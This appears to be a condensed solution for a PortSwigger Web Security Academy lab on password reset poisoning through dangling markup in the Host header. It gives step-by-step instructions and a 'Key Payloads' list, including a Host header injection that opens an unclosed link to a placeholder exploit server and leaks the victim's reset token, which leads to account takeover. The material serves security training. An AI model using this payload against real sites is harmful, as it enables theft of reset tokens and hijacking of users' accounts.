## Password reset poisoning via dangling markup

**Category:** host_header
**Difficulty:** Expert

### Description
This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.

### Solution Steps
1. Explore the password reset functionality - submit a reset for your account
2. Check your email client (GET /email) to see the reset email format
3. Notice the reset link contains a token and the email may have other content after it
4. The Host header is reflected in the email but sanitized (DOMPurify or similar)
5. Try injecting a port in Host header: `Host: YOUR-LAB-ID.web-security-academy.net:arbitrary`
6. Discover you can inject partial HTML via Host header that creates "dangling markup"
7. Inject: `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER/?`
8. This creates an unclosed tag that captures subsequent content (including the reset token)
9. Request password reset for carlos with the poisoned Host header
10. When carlos's email client loads the email, the dangling markup sends his token to your server
11. Check exploit server logs for the captured token
12. Use the token to reset carlos's password and login

### Key Payloads
- `wiener:peter`
- `GET /email`
- `DOMPurify`
- `POST /forgot-password`
- `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER/?`
- `username=carlos`

### Indicators of Success
- Email contains injected dangling markup
- Exploit server receives request with token in URL
- Password reset link for carlos captured
- Successfully login as carlos with new password

---
*Source: PortSwigger Web Security Academy*
